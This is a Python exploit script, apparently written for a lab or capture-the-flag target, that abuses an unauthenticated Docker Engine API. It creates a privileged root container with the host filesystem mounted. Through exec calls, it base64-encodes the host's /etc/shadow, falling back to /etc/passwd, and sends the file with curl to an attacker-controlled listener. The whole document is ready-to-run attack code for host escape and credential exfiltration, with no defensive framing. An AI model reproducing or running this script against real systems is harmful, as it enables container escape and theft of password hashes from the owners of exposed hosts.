import requests
import json
import time

# === CONFIG ===
target = "http://x.X.x.X:xxxx"
image = "<ENUM THIS>"
attacker_host = "http://x.X.x.X:8000"  # Change this to YOUR IP
container_cmd = "while true; do sleep 1; done"

# Target files (try shadow, fallback to passwd)
primary_file = "/host/etc/shadow"
fallback_file = "/host/etc/passwd"
exfil_path = "/loot"

# Function to run a command inside the container
def exec_command(container_id, command):
    print(f"[*] Creating exec for: {command}")
    exec_payload = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["sh", "-c", command]
    }
    r = requests.post(f"{target}/containers/{container_id}/exec", json=exec_payload)
    exec_id = r.json().get("Id")
    if not exec_id:
        print("[-] Failed to create exec")
        return False
    r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
    if r.status_code != 200:
        print("[-] Exec failed:", r.text)
        return False
    return True

print("[+] Target Docker API:", target)
print("[+] Attacker receiving exfil at:", attacker_host + exfil_path)

# Step 1: Create container
print("[*] Creating container...")
container_create_payload = {
    "Image": image,
    "User": "0",  # run as root
    "Cmd": ["sh", "-c", container_cmd],
    "HostConfig": {
        "Binds": ["/:/host"],
        "Privileged": True
    }
}
r = requests.post(f"{target}/containers/create", json=container_create_payload)
if r.status_code != 201:
    print("[-] Container creation failed:", r.text)
    exit(1)
container_id = r.json()["Id"]
print(f"[+] Container ID: {container_id}")

# Step 2: Start container
print("[*] Starting container...")
r = requests.post(f"{target}/containers/{container_id}/start")
if r.status_code not in [204, 200]:
    print("[-] Failed to start container:", r.text)
    exit(1)
print("[+] Container running")

# Step 3: Wait for container to settle
time.sleep(2)

# Step 4: Try to exfil /etc/shadow, fallback to /etc/passwd
encoded_shadow = f"base64 {primary_file} | curl -X POST -d @- {attacker_host}{exfil_path}/shadow"
encoded_passwd = f"base64 {fallback_file} | curl -X POST -d @- {attacker_host}{exfil_path}/passwd"

print(f"[*] Attempting to exfil '{primary_file}' (base64 encoded)...")
if exec_command(container_id, encoded_shadow):
    print("[+] Shadow file exfil triggered!")
else:
    print("[!] Failed to exfil shadow, trying passwd...")
    if exec_command(container_id, encoded_passwd):
        print("[+] Passwd file exfil triggered!")
    else:
        print("[-] Failed to exfil both shadow and passwd")

print("[*] Done. Check your listener.")
